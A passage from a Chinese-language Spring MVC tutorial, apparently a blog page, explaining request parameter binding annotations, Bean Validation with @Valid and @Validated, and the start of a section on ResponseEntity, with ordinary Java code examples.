<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/api/users&quot;)</span></span><br><span class="line"><span class="keyword">public</span> User <span class="title function_">findUser</span><span class="params">(</span></span><br><span class="line"><span class="params">    // <span class="number">1.</span> 基本用法 (参数名与方法变量名一致)</span></span><br><span class="line">    String name,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 指定请求参数名，并设为可选</span></span><br><span class="line">    <span class="meta">@RequestParam(name = &quot;user_age&quot;, required = false)</span> Integer age,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 提供默认值</span></span><br><span class="line">    <span class="meta">@RequestParam(defaultValue = &quot;1&quot;)</span> <span class="type">int</span> page,</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 4. 接收多个同名参数到一个List中</span></span><br><span class="line">    <span class="meta">@RequestParam(&quot;roles&quot;)</span> List&lt;String&gt; roles <span class="comment">// e.g., ?roles=admin&amp;roles=user</span></span><br><span class="line">) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">User</span>(name, age);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>不带注解的情况</strong>: 如果一个简单类型的参数（如 <code>String</code>, <code>int</code>）没有加任何注解，Spring MVC会<strong>默认</strong>把它当作 <code>@RequestParam</code> 来处理（且 <code>required=false</code>）。</p>
</li>
</ul>
<hr>
<h5 id="2-PathVariable-提取路径变量"><a href="#2-PathVariable-提取路径变量" class="headerlink" title="2. @PathVariable - 提取路径变量"></a>2. <code>@PathVariable</code> - 提取路径变量</h5><ul>
<li><p><strong>作用</strong>: 用于从<strong>URL路径</strong>中提取值。这在RESTful API设计中非常常见，用于表示对特定资源的访问。</p>
</li>
<li><p><strong>常见场景</strong>: <code>GET /users/123</code> 或 <code>DELETE /orders/order-abc</code>。</p>
</li>
<li><p><strong>URL模板</strong>: 路径中需要使用 <code>{}</code> 占位符来定义变量。</p>
</li>
<li><p><strong>示例</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/users/&#123;userId&#125;/orders/&#123;orderId&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Order <span class="title function_">getOrderDetails</span><span class="params">(</span></span><br><span class="line"><span class="params">    // 将URL中的 &#123;userId&#125; 绑定到 Long类型的 userId 参数</span></span><br><span class="line"><span class="params">    <span class="meta">@PathVariable</span> Long userId,</span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params">    // 如果占位符名称与参数名不一致，需要显式指定</span></span><br><span class="line"><span class="params">    <span class="meta">@PathVariable(&quot;orderId&quot;)</span> String orderIdentifier</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    <span class="comment">// ... find order by userId and orderIdentifier</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Order</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h5 id="3-RequestBody-提取请求体"><a href="#3-RequestBody-提取请求体" class="headerlink" title="3. @RequestBody - 提取请求体"></a>3. <code>@RequestBody</code> - 提取请求体</h5><ul>
<li><p><strong>作用</strong>: 将<strong>整个HTTP请求体 (Request Body)</strong> 的内容读取出来，并通过 <code>HttpMessageConverter</code> (通常是 <code>Jackson2HttpMessageConverter</code>) 将其<strong>反序列化</strong>为一个Java对象（POJO）。</p>
</li>
<li><p><strong>核心要求</strong>: 一个Controller方法中，<strong>最多只能有一个</strong> <code>@RequestBody</code> 注解。</p>
</li>
<li><p><strong>常见场景</strong>: 接收 <code>POST</code>, <code>PUT</code>, <code>PATCH</code> 请求中发送的 <code>application/json</code> 或 <code>application/xml</code> 数据。</p>
</li>
<li><p><strong>示例</strong>:</p>
<ul>
<li><p><strong>客户端发送的JSON</strong>:</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bob&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pwd&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bob@example.com&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Controller方法</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/users/register&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;String&gt; <span class="title function_">registerUser</span><span class="params">(</span></span><br><span class="line"><span class="params">    // 将请求体JSON反序列化为 UserDTO 对象</span></span><br><span class="line"><span class="params">    <span class="meta">@RequestBody</span> UserDTO userDto</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    <span class="comment">// ... process userDto object</span></span><br><span class="line">    System.out.println(userDto.getUsername());</span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.ok(<span class="string">&quot;User registered successfully&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<hr>
<h5 id="4-RequestHeader-提取请求头"><a href="#4-RequestHeader-提取请求头" class="headerlink" title="4. @RequestHeader - 提取请求头"></a>4. <code>@RequestHeader</code> - 提取请求头</h5><ul>
<li><p><strong>作用</strong>: 用于读取HTTP请求头 (Header) 中的特定值。</p>
</li>
<li><p><strong>属性</strong>: 与 <code>@RequestParam</code> 类似，也支持 <code>name</code>, <code>required</code>, <code>defaultValue</code>。</p>
</li>
<li><p><strong>示例</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/api/info&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getInfo</span><span class="params">(</span></span><br><span class="line"><span class="params">    // 读取 <span class="string">&quot;User-Agent&quot;</span> 请求头</span></span><br><span class="line"><span class="params">    <span class="meta">@RequestHeader(&quot;User-Agent&quot;)</span> String userAgent,</span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params">    // 读取一个可选的 <span class="string">&quot;X-Custom-Header&quot;</span>，提供默认值</span></span><br><span class="line"><span class="params">    <span class="meta">@RequestHeader(name = &quot;X-Custom-Header&quot;, defaultValue = &quot;default&quot;)</span> String customHeader,</span></span><br><span class="line"><span class="params">    </span></span><br><span class="line"><span class="params">    // 将所有请求头注入到一个Map中</span></span><br><span class="line"><span class="params">    <span class="meta">@RequestHeader</span> Map&lt;String, String&gt; allHeaders</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;User-Agent: &quot;</span> + userAgent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h5 id="5-CookieValue-提取Cookie值"><a href="#5-CookieValue-提取Cookie值" class="headerlink" title="5. @CookieValue - 提取Cookie值"></a>5. <code>@CookieValue</code> - 提取Cookie值</h5><ul>
<li><p><strong>作用</strong>: 用于从HTTP请求的Cookie中读取特定<code>name</code>的值。</p>
</li>
<li><p><strong>属性</strong>: 与 <code>@RequestParam</code> 类似，也支持 <code>name</code>, <code>required</code>, <code>defaultValue</code>。</p>
</li>
<li><p><strong>示例</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/profile&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getUserProfile</span><span class="params">(</span></span><br><span class="line"><span class="params">    // 读取名为 <span class="string">&quot;sessionId&quot;</span> 的cookie</span></span><br><span class="line"><span class="params">    <span class="meta">@CookieValue(&quot;sessionId&quot;)</span> String sessionId,</span></span><br><span class="line"><span class="params">    </span></span><br><span class="line"><span class="params">    // 读取一个可选的cookie</span></span><br><span class="line"><span class="params">    <span class="meta">@CookieValue(name = &quot;theme&quot;, required = false)</span> String theme</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    <span class="comment">// ... use sessionId to find user session</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Profile for session: &quot;</span> + sessionId;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h5 id="6-无注解的POJO绑定-表单数据到对象"><a href="#6-无注解的POJO绑定-表单数据到对象" class="headerlink" title="6. 无注解的POJO绑定 - 表单数据到对象"></a>6. 无注解的POJO绑定 - 表单数据到对象</h5><ul>
<li><p><strong>作用</strong>: 当请求是 <code>GET</code> 的查询参数或 <code>POST</code> 的 <code>x-www-form-urlencoded</code> 表单数据时，Spring MVC可以<strong>自动</strong>将这些参数<strong>按名称匹配</strong>并绑定到一个POJO对象的字段上。</p>
</li>
<li><p><strong>要求</strong>: POJO类必须有<strong>无参构造函数</strong>和对应字段的<strong>setter方法</strong>。</p>
</li>
<li><p><strong>示例</strong>:</p>
<ul>
<li><p><strong>请求</strong>: <code>POST /users/create</code>，请求体为 <code>username=carol&amp;email=carol@example.com</code></p>
</li>
<li><p><strong>POJO类 (<code>UserCreateForm.java</code>)</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserCreateForm</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line">    <span class="comment">// Getters and Setters ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Controller方法</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/users/create&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">createUser</span><span class="params">(UserCreateForm form)</span> &#123; <span class="comment">// 无需任何注解</span></span><br><span class="line">    <span class="comment">// Spring会自动 new UserCreateForm(), 然后调用 setUsername(&quot;carol&quot;) 和 setEmail(&quot;carol@example.com&quot;)</span></span><br><span class="line">    System.out.println(form.getUsername());</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;User created&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<hr>
<h4 id="1-3-2-数据校验"><a href="#1-3-2-数据校验" class="headerlink" title="1.3.2 数据校验"></a>1.3.2 数据校验</h4><p>数据校验的目的是确保客户端发送到后端的数据符合预定义的规则。例如，用户名不能为空、邮箱必须符合格式、年龄必须是正整数等。如果在业务逻辑代码中手动进行大量的<code>if-else</code>判断来做校验，会使代码变得臃肿、重复且难以维护。</p>
<p>Spring MVC 深度集成了 <strong>Bean Validation (JSR-303 &#x2F; JSR-380)</strong> 规范，允许我们通过<strong>声明式注解</strong>的方式来定义校验规则，并通过框架自动执行校验。</p>
<p><strong>Hibernate Validator</strong> 是 Bean Validation 规范最流行、也是Spring Boot默认集成的实现库。</p>
<h5 id="1-核心依赖"><a href="#1-核心依赖" class="headerlink" title="1. 核心依赖"></a>1. 核心依赖</h5><p>要使用数据校验功能，首先需要确保项目中包含了 <code>spring-boot-starter-validation</code> 依赖。通常情况下，如果你引入了 <code>spring-boot-starter-web</code>，这个校验依赖已经<strong>被传递性地包含</strong>进来了，无需额外添加。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-validation<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h5 id="2-如何使用"><a href="#2-如何使用" class="headerlink" title="2. 如何使用"></a>2. 如何使用</h5><p>数据校验的使用通常分为两步：</p>
<ol>
<li><strong>在DTO&#x2F;VO上添加校验注解</strong>：在需要被校验的Java Bean（通常是用于接收请求体的DTO - Data Transfer Object）的字段上，添加JSR-303&#x2F;380规范定义的校验注解。</li>
<li><strong>在Controller方法上开启校验</strong>：在Controller方法的对应参数上，添加 <code>@Valid</code> 或 <code>@Validated</code> 注解，来触发对该对象的校验。</li>
</ol>
<h6 id="a-在DTO上添加校验注解"><a href="#a-在DTO上添加校验注解" class="headerlink" title="a. 在DTO上添加校验注解"></a>a. 在DTO上添加校验注解</h6><p>我们创建一个 <code>UserRegisterDTO</code> 来接收用户注册的请求数据，并为其添加校验规则。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.validation.constraints.*;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserRegisterDTO</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@NotEmpty(message = &quot;用户名不能为空&quot;)</span></span><br><span class="line">    <span class="meta">@Size(min = 4, max = 20, message = &quot;用户名长度必须在4到20个字符之间&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@NotBlank(message = &quot;密码不能为空&quot;)</span></span><br><span class="line">    <span class="meta">@Pattern(regexp = &quot;^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)[\\s\\S]&#123;8,16&#125;$&quot;, </span></span><br><span class="line"><span class="meta">             message = &quot;密码必须8-16位，且包含大小写字母和数字&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@NotNull(message = &quot;年龄不能为空&quot;)</span></span><br><span class="line">    <span class="meta">@Min(value = 18, message = &quot;年龄必须大于等于18岁&quot;)</span></span><br><span class="line">    <span class="meta">@Max(value = 100, message = &quot;年龄不能超过100岁&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@NotBlank(message = &quot;邮箱不能为空&quot;)</span></span><br><span class="line">    <span class="meta">@Email(message = &quot;邮箱格式不正确&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 嵌套对象校验</span></span><br><span class="line">    <span class="meta">@Valid</span> <span class="comment">// 必须加上@Valid，才会对嵌套对象进行校验</span></span><br><span class="line">    <span class="meta">@NotNull</span></span><br><span class="line">    <span class="keyword">private</span> Address address;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Address</span> &#123;</span><br><span class="line">        <span class="meta">@NotBlank</span></span><br><span class="line">        <span class="keyword">private</span> String street;</span><br><span class="line">        <span class="meta">@NotBlank</span></span><br><span class="line">        <span class="keyword">private</span> String city;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Getters and Setters...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>常用的校验注解 (位于 <code>javax.validation.constraints</code> 包下)</strong>:</p>
<table>
<thead>
<tr>
<th align="left">注解</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong><code>@NotNull</code></strong></td>
<td align="left">验证对象不能为 <code>null</code>。</td>
</tr>
<tr>
<td align="left"><strong><code>@NotBlank</code></strong></td>
<td align="left">验证字符串<strong>不能为 <code>null</code> 且去除首尾空格后长度必须大于0</strong>。 (专用于字符串)</td>
</tr>
<tr>
<td align="left"><strong><code>@NotEmpty</code></strong></td>
<td align="left">验证对象<strong>不能为 <code>null</code> 且大小&#x2F;长度必须大于0</strong>。 (可用于String, Collection, Map, Array)</td>
</tr>
<tr>
<td align="left"><strong><code>@Size(min, max)</code></strong></td>
<td align="left">验证对象（String, Collection, Map, Array）的大小&#x2F;长度是否在指定范围内。</td>
</tr>
<tr>
<td align="left"><strong><code>@Min(value)</code></strong></td>
<td align="left">验证数字是否大于等于指定值。</td>
</tr>
<tr>
<td align="left"><strong><code>@Max(value)</code></strong></td>
<td align="left">验证数字是否小于等于指定值。</td>
</tr>
<tr>
<td align="left"><strong><code>@Email</code></strong></td>
<td align="left">验证字符串是否为合法的Email格式。</td>
</tr>
<tr>
<td align="left"><strong><code>@Pattern(regexp)</code></strong></td>
<td align="left">验证字符串是否匹配指定的正则表达式。</td>
</tr>
<tr>
<td align="left"><strong><code>@Past</code> &#x2F; <code>@Future</code></strong></td>
<td align="left">验证日期是否为过去或将来的日期。</td>
</tr>
<tr>
<td align="left"><strong><code>@Valid</code></strong></td>
<td align="left"><strong>用于嵌套对象</strong>。标记在一个字段上，表示需要<strong>级联校验</strong>这个字段所引用的对象的内部规则。</td>
</tr>
</tbody></table>
<hr>
<h6 id="b-在Controller方法上开启校验"><a href="#b-在Controller方法上开启校验" class="headerlink" title="b. 在Controller方法上开启校验"></a>b. 在Controller方法上开启校验</h6><p>在Controller方法中，我们在需要校验的参数（通常是被 <code>@RequestBody</code> 标记的对象）前面加上 <code>@Valid</code> 或 <code>@Validated</code> 注解。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/api/users&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/register&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;String&gt; <span class="title function_">registerUser</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="meta">@Valid</span> <span class="meta">@RequestBody</span> UserRegisterDTO userDto,</span></span><br><span class="line"><span class="params">        BindingResult bindingResult // 紧跟在校验对象后面，用于接收校验结果</span></span><br><span class="line"><span class="params">    )</span> &#123;</span><br><span class="line">        <span class="comment">// 方式一：手动处理校验结果 (灵活)</span></span><br><span class="line">        <span class="keyword">if</span> (bindingResult.hasErrors()) &#123;</span><br><span class="line">            <span class="comment">// 获取第一个错误信息并返回</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">firstError</span> <span class="operator">=</span> bindingResult.getAllErrors().get(<span class="number">0</span>).getDefaultMessage();</span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.badRequest().body(firstError);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果校验通过，则执行业务逻辑</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.ok(<span class="string">&quot;User registered successfully!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong><code>BindingResult</code> 对象</strong>:</p>
<ul>
<li>这是一个<strong>可选的</strong>参数，它必须<strong>紧跟在</strong>被校验的参数后面。</li>
<li>它的作用是<strong>捕获</strong>校验过程中产生的所有错误信息。</li>
<li>如果Controller方法中包含了 <code>BindingResult</code> 参数，当校验失败时，<strong>Spring MVC不会立即抛出异常</strong>，而是将错误信息填充到 <code>BindingResult</code> 中，然后继续执行方法体。这给了我们<strong>手动处理和定制错误响应</strong>的机会。</li>
<li>如果<strong>没有</strong> <code>BindingResult</code> 参数，一旦校验失败，Spring MVC会立即抛出 <code>MethodArgumentNotValidException</code> 异常，请求流程中断。</li>
</ul>
<hr>
<h5 id="3-全局异常处理校验失败"><a href="#3-全局异常处理校验失败" class="headerlink" title="3. 全局异常处理校验失败"></a>3. 全局异常处理校验失败</h5><p>手动在每个Controller方法中检查 <code>BindingResult</code> 是一种重复劳动。更好的实践是使用全局异常处理器（<code>@RestControllerAdvice</code>）来统一捕获 <code>MethodArgumentNotValidException</code> 并返回一个结构化的错误响应，在1.5.1 全局异常处理中会有详细说明。</p>
<hr>
<h5 id="4-Valid-vs-Validated"><a href="#4-Valid-vs-Validated" class="headerlink" title="4. @Valid vs @Validated"></a>4. <code>@Valid</code> vs <code>@Validated</code></h5><table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left"><code>@Valid</code> (JSR-303标准)</th>
<th align="left"><code>@Validated</code> (Spring特有)</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>来源</strong></td>
<td align="left"><code>javax.validation</code></td>
<td align="left"><code>org.springframework.validation.annotation</code></td>
</tr>
<tr>
<td align="left"><strong>功能</strong></td>
<td align="left">标准的校验功能</td>
<td align="left">继承了<code>@Valid</code>的所有功能，并提供了<strong>分组校验</strong>的能力。</td>
</tr>
<tr>
<td align="left"><strong>使用位置</strong></td>
<td align="left">方法参数、字段、构造函数参数</td>
<td align="left">方法参数、字段、构造函数参数、<strong>类、方法</strong></td>
</tr>
<tr>
<td align="left"><strong>分组校验</strong></td>
<td align="left">不支持</td>
<td align="left"><strong>支持</strong>。允许定义不同的校验组，在不同场景下应用不同的校验规则。</td>
</tr>
</tbody></table>
<p><strong>分组校验示例</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 定义分组接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">OnCreate</span> &#123;&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">OnUpdate</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 在DTO中使用groups属性</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDTO</span> &#123;</span><br><span class="line">    <span class="meta">@NotNull(groups = OnUpdate.class)</span> <span class="comment">// id在更新时不能为空</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@NotBlank(groups = &#123;OnCreate.class, OnUpdate.class&#125;)</span> <span class="comment">// username在创建和更新时都不能为空</span></span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 在Controller中指定要校验的分组</span></span><br><span class="line"><span class="meta">@PostMapping</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createUser</span><span class="params">(<span class="meta">@Validated(OnCreate.class)</span> <span class="meta">@RequestBody</span> UserDTO user)</span> &#123; ... &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@PutMapping</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateUser</span><span class="params">(<span class="meta">@Validated(OnUpdate.class)</span> <span class="meta">@RequestBody</span> UserDTO user)</span> &#123; ... &#125;</span><br></pre></td></tr></table></figure>

<p><strong>总结</strong>：在简单的校验场景中，<code>@Valid</code> 和 <code>@Validated</code> 可以互换。当你需要更高级的分组校验功能时，必须使用 <code>@Validated</code>。在Spring环境中，使用 <code>@Validated</code> 通常是更好的选择。</p>
<hr>
<h3 id="1-4-响应处理"><a href="#1-4-响应处理" class="headerlink" title="1.4 响应处理"></a>1.4 响应处理</h3><h4 id="1-4-1-ResponseEntity"><a href="#1-4-1-ResponseEntity" class="headerlink" title="1.4.1 ResponseEntity"></a>1.4.1 <code>ResponseEntity</code></h4><h5 id="1-什么是-ResponseEntity？"><a href="#1-什么是-ResponseEntity？" class="headerlink" title="1. 什么是 ResponseEntity？"></a>1. 什么是 <code>ResponseEntity</code>？</h5><p><code>ResponseEntity</code> 是 Spring 提供的一个泛型类，它代表了<strong>整个 HTTP 响应</strong>。通过使用它，你可以完全控制响应的<strong>状态码 (Status Code)</strong>、<strong>响应头 (Headers)</strong> 和<strong>响应体 (Body)</strong>。</p>
<p>在简单的场景中，<code>@RestController</code> 的方法可以直接返回一个POJO（如 <code>User</code> 对象），Spring 会默认：</p>
<ul>
<li><strong>状态码</strong>: <code>200 OK</code></li>
<li><strong>响应头</strong>: <code>Content-Type: application/json</code> (通常)</li>
<li><strong>响应体</strong>: POJO 序列化后的 JSON 字符串</li>
</ul>
<p>但是，现实世界的 API 需要更丰富的表达能力。例如：</p>
<ul>
<li>成功创建资源后，应该返回 <code>201 Created</code> 状态码，并在 <code>Location</code> 头中提供新资源的URL。</li>
<li>请求的资源不存在时，应该返回 <code>404 Not Found</code> 状态码，并且响应体可能为空。</li>
<li>请求处理成功但无需返回内容时（如删除操作），应该返回 <code>204 No Content</code> 状态码。</li>
<li>需要添加自定义的响应头，如缓存控制（<code>Cache-Control</code>）或认证令牌。</li>
</ul>
<p><strong><code>ResponseEntity</code> 就是为了满足这些精细化控制需求而生的。</strong></p>
<hr>
<h5 id="2-ResponseEntity-的组成"><a href="#2-ResponseEntity-的组成" class="headerlink" title="2. ResponseEntity 的组成"></a>2. <code>ResponseEntity</code> 的组成</h5><p><code>ResponseEntity&lt;T&gt;</code> 包含了三个核心部分：</p>
<ol>
<li><strong><code>T body</code></strong>: 响应体。泛型 <code>T</code> 代表了响应体的数据类型，可以是任何Java对象（POJO、List、Map等），也可以是 <code>Void</code>（表示没有响应体）。</li>
<li><strong><code>HttpStatus status</code></strong>: HTTP 状态码。这是一个枚举类，包含了所有标准的HTTP状态码，如 <code>HttpStatus.OK</code>, <code>HttpStatus.CREATED</code>, <code>HttpStatus.NOT_FOUND</code> 等。</li>
<li><strong><code>HttpHeaders headers</code></strong>: HTTP 响应头。一个可以方便地添加和设置各种响应头的对象。</li>
</ol>
<hr>
